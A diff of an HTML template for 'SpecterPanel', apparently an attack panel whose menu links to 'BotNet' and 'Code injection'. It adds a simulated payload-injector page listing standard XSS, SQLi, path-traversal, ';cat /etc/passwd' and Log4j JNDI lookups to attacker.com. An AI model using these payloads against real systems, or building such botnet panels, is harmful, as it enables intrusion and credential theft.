@@ -3,126 +3,657 @@
 
 {% block style %}
 <style>
-  .editor-container {
-    max-width: 960px;
-    margin: 40px auto;
-    background-color: #1a1f2b;
-    padding: 30px;
-    border-radius: 12px;
-    color: #fff;
-  }
+  :root {
+      --bg-dark: #121212;
+      --bg-card: #1e1e1e;
+      --bg-header: #222;
+      --text-primary: #f0f0f0;
+      --text-secondary: #ddd;
+      --accent-color: #7bd389;
+      --danger-color: #ff6b6b;
+      --warning-color: #ffa726;
+      --border-color: #333;
+      --border-light: #444;
+      --success-color: #66bb6a;
+      --info-color: #42a5f5;
+      --transition-speed: 0.25s;
+      --shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+      --editor-bg: #181818;
+    }
 
-  .editor-title {
-    margin-bottom: 20px;
-    color: #58a6ff;
-  }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-  .editor-wrapper {
-    display: flex;
-    border: 1px solid #333;
-    border-radius: 8px;
-    overflow: hidden;
-  }
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-primary);
+      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      line-height: 1.6;
+      padding: 20px;
+      min-height: 100vh;
+    }
 
-  .line-numbers {
-    background-color: #161b22;
-    color: #8b949e;
-    text-align: right;
-    user-select: none;
-    font-family: monospace;
-    font-size: 14px;
-    padding: 10px 6px;
-    line-height: 1.4;
-  }
+    .main-container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
 
-  .code-editor {
-    flex: 1;
-    font-family: monospace;
-    font-size: 14px;
-    background-color: #0d1117;
-    color: #d6e1ff;
-    padding: 10px;
-    overflow: auto;
-    line-height: 1.4;
-    outline: none;
-    white-space: pre-wrap;
-    word-wrap: break-word;
-  }
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid var(--border-color);
+    }
 
-  .editor-actions {
-    margin-top: 20px;
-    display: flex;
-    gap: 10px;
-  }
+    .header h1 {
+      color: var(--accent-color);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
 
-  .btn-save {
-    background-color: #28a745;
-    color: #fff;
-  }
+    .header p {
+      color: var(--text-secondary);
+      max-width: 700px;
+      margin: 0 auto;
+    }
 
-  .btn-save:hover {
-    background-color: #218838;
-  }
+    .warning-banner {
+      background-color: rgba(255, 167, 38, 0.2);
+      border-left: 4px solid var(--warning-color);
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
 
-  .btn-phantom {
-    background-color: #007bff;
-    color: #fff;
-  }
+    .top-container {
+      display: flex;
+      gap: 25px;
+      margin-bottom: 25px;
+      flex-wrap: wrap;
+    }
 
-  .btn-phantom:hover {
-    background-color: #0069d9;
-  }
+    .box {
+      flex: 1;
+      border-radius: 8px;
+      background-color: var(--bg-card);
+      box-shadow: var(--shadow);
+      transition: transform var(--transition-speed) ease;
+      min-width: 300px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .box:hover {
+      transform: translateY(-3px);
+    }
+
+    .box h3 {
+      margin: 0;
+      padding: 15px;
+      background: var(--bg-header);
+      color: var(--accent-color);
+      font-size: 1.1rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* Payload Table */
+    .payload-table {
+      width: 100%;
+      border-collapse: collapse;
+      flex: 1;
+    }
+
+    .payload-table th {
+      background-color: var(--bg-header);
+      color: var(--accent-color);
+      padding: 12px;
+      text-align: left;
+      font-weight: 500;
+      position: sticky;
+      top: 0;
+    }
+
+    .payload-table td {
+      padding: 12px;
+      border-bottom: 1px solid var(--border-light);
+      color: var(--text-secondary);
+      text-align: left;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+    }
+
+    .payload-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .payload-table tr:hover td {
+      background-color: rgba(255, 255, 255, 0.05);
+      cursor: pointer;
+    }
+
+    .payload-table .payload-type {
+      font-size: 0.75rem;
+      padding: 3px 6px;
+      border-radius: 3px;
+      margin-left: 8px;
+    }
+
+    .type-xss {
+      background-color: rgba(244, 67, 54, 0.2);
+      color: #f44336;
+    }
+
+    .type-lfi {
+      background-color: rgba(66, 165, 245, 0.2);
+      color: var(--info-color);
+    }
+
+    .type-sqli {
+      background-color: rgba(102, 187, 106, 0.2);
+      color: var(--success-color);
+    }
+
+    /* Code Editor */
+    .editor-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .editor {
+      flex: 1;
+      padding: 15px;
+      background-color: var(--editor-bg);
+      border: none;
+      color: var(--text-primary);
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 14px;
+      resize: none;
+      line-height: 1.5;
+      tab-size: 2;
+    }
+
+    .editor:focus {
+      outline: none;
+      box-shadow: inset 0 0 0 1px var(--accent-color);
+    }
+
+    /* Controls */
+    .controls {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 15px;
+      border-top: 1px solid var(--border-color);
+      background: var(--bg-header);
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .select-wrapper {
+      position: relative;
+      flex: 1;
+      min-width: 200px;
+    }
+
+    .select-wrapper::after {
+      content: '▼';
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      color: var(--text-secondary);
+      font-size: 0.7rem;
+      pointer-events: none;
+    }
+
+    select {
+      width: 100%;
+      padding: 8px 12px;
+      border-radius: 4px;
+      border: 1px solid var(--border-light);
+      background: var(--bg-card);
+      color: var(--text-primary);
+      font-size: 14px;
+      appearance: none;
+      cursor: pointer;
+    }
+
+    select:focus {
+      outline: none;
+      border-color: var(--accent-color);
+    }
+
+    .btn {
+      padding: 8px 16px;
+      border-radius: 4px;
+      border: none;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all var(--transition-speed) ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .btn-primary {
+      background-color: var(--accent-color);
+      color: #000;
+    }
+
+    .btn-primary:hover {
+      background-color: #66c77c;
+      transform: translateY(-2px);
+    }
+
+    .btn-danger {
+      background-color: var(--danger-color);
+      color: #fff;
+    }
+
+    .btn-danger:hover {
+      background-color: #e55b5b;
+      transform: translateY(-2px);
+    }
+
+    /* Result box */
+    .result {
+      border-radius: 8px;
+      background-color: var(--bg-card);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+    }
+
+    .result h3 {
+      margin: 0;
+      padding: 15px;
+      background: var(--bg-header);
+      color: var(--accent-color);
+      font-size: 1.1rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .result-content {
+      padding: 15px;
+      min-height: 150px;
+      font-family: 'Fira Code', 'Courier New', monospace;
+      color: var(--accent-color);
+      white-space: pre-wrap;
+      background-color: var(--editor-bg);
+      border-radius: 0 0 8px 8px;
+      overflow-x: auto;
+    }
+
+    .result-error {
+      color: var(--danger-color);
+    }
+
+    .result-success {
+      color: var(--success-color);
+    }
+
+    /* Responsive design */
+    @media (max-width: 768px) {
+      .top-container {
+        flex-direction: column;
+      }
+      
+      .box {
+        min-width: 100%;
+      }
+      
+      .controls {
+        flex-direction: column;
+      }
+      
+      .btn {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+
+    /* Animations */
+    @keyframes pulse {
+      0% { opacity: 0.6; }
+      50% { opacity: 1; }
+      100% { opacity: 0.6; }
+    }
+
+    .loading {
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+
+    /* Tooltip */
+    [data-tooltip] {
+      position: relative;
+    }
+
+    [data-tooltip]:hover::after {
+      content: attr(data-tooltip);
+      position: absolute;
+      bottom: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #333;
+      color: #fff;
+      padding: 5px 10px;
+      border-radius: 4px;
+      font-size: 0.8rem;
+      white-space: nowrap;
+      z-index: 10;
+      margin-bottom: 5px;
+    }
 </style>
 {% endblock %}
 
 {% block menus %}
 <nav class="sidebar sidebar-offcanvas" id="sidebar">
-  <div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
-    <a class="sidebar-brand brand-logo" href="/dashboard">SpecterPanel</a>
-    <a class="sidebar-brand brand-logo-mini" href="/dashboard">SP</a>
-  </div>
-  <ul class="nav">
-    <li class="nav-item nav-category"><span class="nav-link">Menu Options</span></li>
-    <li class="nav-item menu-items"><a class="nav-link" href="/dashboard"><span class="menu-icon"><i class="mdi mdi-view-dashboard"></i></span><span class="menu-title">Dashboard</span></a></li>
-    <li class="nav-item menu-items"><a class="nav-link" href="/api_link"><span class="menu-icon"><i class="mdi mdi-webhook"></i></span><span class="menu-title">Api Link</span></a></li>
-    <li class="nav-item menu-items"><a class="nav-link" href="/fishing"><span class="menu-icon"><i class="mdi mdi-fish"></i></span><span class="menu-title">Fishing</span></a></li>
-    <li class="nav-item menu-items"><a class="nav-link" href="/hooking"><span class="menu-icon"><i class="mdi mdi-hook"></i></span><span class="menu-title">Hooking</span></a></li>
-    <li class="nav-item menu-items"><a class="nav-link" href="/code"><span class="menu-icon"><i class="mdi mdi-code-braces"></i></span><span class="menu-title">Code ground</span></a></li>
-    <li class="nav-item menu-items"><a class="nav-link" href="/settings"><span class="menu-icon"><i class="mdi mdi-settings"></i></span><span class="menu-title">Settings</span></a></li>
-  </ul>
+	<div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
+		<a class="sidebar-brand brand-logo" href="/dashboard">SpecterPanel</a>
+		<a class="sidebar-brand brand-logo-mini" href="/dashboard">SP</a>
+	</div>
+	<ul class="nav">
+		<li class="nav-item nav-category">
+			<span class="nav-link">Menu Options</span>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/dashboard">
+				<span class="menu-icon">
+					<i class="mdi mdi-view-dashboard"></i>
+				</span>
+				<span class="menu-title">Dashboard</span>
+			</a>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/api_link">
+				<span class="menu-icon">
+					<i class="mdi mdi-robot"></i>
+				</span>
+				<span class="menu-title">BotNet</span>
+			</a>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/code">
+				<span class="menu-icon">
+					<i class="mdi mdi-needle"></i>
+				</span>
+				<span class="menu-title">Code injection</span>
+			</a>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/settings">
+				<span class="menu-icon">
+					<i class="mdi mdi-settings"></i>
+				</span>
+				<span class="menu-title">settings</span>
+			</a>
+		</li>
+	</ul>
 </nav>
 {% endblock %}
 
 {% block body %}
-<div class="container editor-container">
-  <h2 class="editor-title">Code Editor Panel</h2>
-  <form method="POST" action="#">
-    <div class="editor-wrapper" style="height: 400px;">
-      <div class="line-numbers" id="lineNumbers"></div>
-      <div id="codeEditor" class="code-editor" contenteditable="true" spellcheck="false" name="code"></div>
+<div class="main-container">
+    <header class="header">
+      <h1><i class="fas fa-code"></i> Advanced Payload Injector</h1>
+      <p>Test and analyze payloads for security research purposes only</p>
+    </header>
+
+    <div class="warning-banner">
+      <i class="fas fa-exclamation-triangle"></i>
+      <div>
+        <strong>Warning:</strong> This tool is for authorized security testing only. 
+        Unauthorized use against systems you don't own is illegal.
+      </div>
     </div>
-    <div class="editor-actions">
-      <button type="submit" name="type" value="botnet" class="btn btn-save">Save as Botnet Script</button>
-      <button type="submit" name="type" value="phantom" class="btn btn-phantom">Save as PhantomGate Extension</button>
+
+    <div class="top-container">
+      <!-- Payload Library -->
+      <div class="box">
+        <h3><i class="fas fa-book"></i> Payload Library</h3>
+        <table class="payload-table" aria-label="Payload library">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Payload</th>
+              <th>Type</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr data-payload="alert('XSS')">
+              <td>1</td>
+              <td>alert('XSS')</td>
+              <td><span class="payload-type type-xss">XSS</span></td>
+            </tr>
+            <tr data-payload="../etc/passwd">
+              <td>2</td>
+              <td>../etc/passwd</td>
+              <td><span class="payload-type type-lfi">LFI</span></td>
+            </tr>
+            <tr data-payload="' OR 1=1 --">
+              <td>3</td>
+              <td>' OR 1=1 --</td>
+              <td><span class="payload-type type-sqli">SQLi</span></td>
+            </tr>
+            <tr data-payload="&lt;script&gt;alert(1)&lt;/script&gt;">
+              <td>4</td>
+              <td>&lt;script&gt;alert(1)&lt;/script&gt;</td>
+              <td><span class="payload-type type-xss">XSS</span></td>
+            </tr>
+            <tr data-payload="${jndi:ldap://attacker.com/a}">
+              <td>5</td>
+              <td>${jndi:ldap://attacker.com/a}</td>
+              <td><span class="payload-type type-lfi">Log4j</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- Code Editor -->
+      <div class="box">
+        <h3><i class="fas fa-edit"></i> Payload Editor</h3>
+        <div class="editor-container">
+          <textarea 
+            id="payloadEditor" 
+            class="editor" 
+            placeholder="// Enter your payload here...&#10;// Click on payloads from the library to insert them"
+            spellcheck="false"></textarea>
+          <div class="controls">
+            <div class="select-wrapper">
+              <select id="payloadType">
+                <option value="random">Random Payload</option>
+                <option value="xss">XSS Payloads</option>
+                <option value="lfi">LFI Payloads</option>
+                <option value="sqli">SQLi Payloads</option>
+                <option value="custom">Custom Template</option>
+              </select>
+            </div>
+            <div class="btn-group">
+              <button id="clearBtn" class="btn btn-danger" aria-label="Clear editor">
+                <i class="fas fa-trash-alt"></i> Clear
+              </button>
+              <button id="injectBtn" class="btn btn-primary" aria-label="Inject payload">
+                <i class="fas fa-bolt"></i> Inject
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
-  </form>
-</div>
 
-<script>
-  const editor = document.getElementById('codeEditor');
-  const lineNumbers = document.getElementById('lineNumbers');
+    <!-- Results Panel -->
+    <div class="result">
+      <h3><i class="fas fa-vial"></i> Injection Results</h3>
+      <div id="resultOutput" class="result-content">
+        Waiting for payload injection...
+      </div>
+    </div>
+  </div>
+{% endblock %}
+{% block script %}
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const payloadEditor = document.getElementById('payloadEditor');
+      const resultOutput = document.getElementById('resultOutput');
+      const injectBtn = document.getElementById('injectBtn');
+      const clearBtn = document.getElementById('clearBtn');
+      const payloadType = document.getElementById('payloadType');
+      const payloadRows = document.querySelectorAll('.payload-table tbody tr');
 
-  function updateLineNumbers() {
-    const lines = editor.innerText.split('\n').length;
-    lineNumbers.innerHTML = Array.from({ length: lines }, (_, i) => (i + 1)).join('<br>');
-  }
+      // Load payload when clicked in the library
+      payloadRows.forEach(row => {
+        row.addEventListener('click', function() {
+          const payload = this.getAttribute('data-payload');
+          payloadEditor.value = payload;
+          
+          // Highlight the selected row
+          payloadRows.forEach(r => r.classList.remove('selected'));
+          this.classList.add('selected');
+        });
+        
+        // Make rows keyboard accessible
+        row.setAttribute('tabindex', '0');
+        row.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter' || e.key === ' ') {
+            this.click();
+            e.preventDefault();
+          }
+        });
+      });
 
-  editor.addEventListener('input', updateLineNumbers);
-  editor.addEventListener('scroll', () => {
-    lineNumbers.scrollTop = editor.scrollTop;
-  });
+      // Clear editor
+      clearBtn.addEventListener('click', function() {
+        payloadEditor.value = '';
+        resultOutput.textContent = 'Editor cleared. Ready for new payload.';
+        resultOutput.className = 'result-content';
+      });
 
-  // Initialize
-  updateLineNumbers();
-</script>
+      // Handle payload injection
+      injectBtn.addEventListener('click', function() {
+        const payload = payloadEditor.value.trim();
+        
+        if (!payload) {
+          resultOutput.textContent = 'Error: No payload entered';
+          resultOutput.className = 'result-content result-error';
+          return;
+        }
+        
+        // Simulate injection
+        simulateInjection(payload);
+      });
+
+      // Load payload based on type selection
+      payloadType.addEventListener('change', function() {
+        const type = this.value;
+        let payload = '';
+        
+        switch(type) {
+          case 'random':
+            payload = getRandomPayload();
+            break;
+          case 'xss':
+            payload = '<script>alert("XSS")<\/script>';
+            break;
+          case 'lfi':
+            payload = '../../../../etc/passwd';
+            break;
+          case 'sqli':
+            payload = "' OR '1'='1' --";
+            break;
+          case 'custom':
+            payload = '/* Customize this template */\n' + 
+                      'function customPayload() {\n' +
+                      '  // Your custom payload logic here\n' +
+                      '  return "vulnerable";\n' +
+                      '}';
+            break;
+        }
+        
+        payloadEditor.value = payload;
+      });
+
+      // Helper functions
+      function getRandomPayload() {
+        const payloads = [
+          '<img src=x onerror=alert(1)>',
+          '${7*7}',
+          ';cat /etc/passwd',
+          '<svg/onload=alert(1)>',
+          'UNION SELECT username, password FROM users--'
+        ];
+        return payloads[Math.floor(Math.random() * payloads.length)];
+      }
+
+      function simulateInjection(payload) {
+        // Show loading state
+        injectBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Injecting...';
+        injectBtn.disabled = true;
+        resultOutput.textContent = 'Executing payload...';
+        resultOutput.className = 'result-content loading';
+        
+        // Simulate processing delay
+        setTimeout(() => {
+          // Randomly determine if injection was successful
+          const isSuccessful = Math.random() > 0.3;
+          
+          if (isSuccessful) {
+            resultOutput.textContent = `Payload executed successfully!\n\n` +
+                                     `Payload: ${payload}\n` +
+                                     `Vulnerability detected: ${detectVulnerabilityType(payload)}\n` +
+                                     `System response: 200 OK\n` +
+                                     `Injection point: Form input field`;
+            resultOutput.className = 'result-content result-success';
+          } else {
+            resultOutput.textContent = `Payload blocked by security controls\n\n` +
+                                     `Payload: ${payload}\n` +
+                                     `Response: 403 Forbidden\n` +
+                                     `Security filter detected: ${detectSecurityFilter(payload)}`;
+            resultOutput.className = 'result-content result-error';
+          }
+          
+          // Reset button
+          injectBtn.innerHTML = '<i class="fas fa-bolt"></i> Inject';
+          injectBtn.disabled = false;
+        }, 1500);
+      }
+
+      function detectVulnerabilityType(payload) {
+        if (payload.includes('<script>') || payload.includes('onerror') || payload.includes('onload')) {
+          return 'Cross-Site Scripting (XSS)';
+        } else if (payload.includes('../') || payload.includes('/etc/passwd')) {
+          return 'Local File Inclusion (LFI)';
+        } else if (payload.includes('OR 1=1') || payload.includes('UNION SELECT')) {
+          return 'SQL Injection (SQLi)';
+        } else if (payload.includes('${')) {
+          return 'Template Injection';
+        }
+        return 'Unknown vulnerability type';
+      }
+
+      function detectSecurityFilter(payload) {
+        const filters = [
+          'Web Application Firewall (WAF)',
+          'Input Validation Filter',
+          'Content Security Policy (CSP)',
+          'ModSecurity Rules',
+          'SQL Injection Prevention'
+        ];
+        return filters[Math.floor(Math.random() * filters.length)];
+      }
+    });
+  </script>
 {% endblock %}
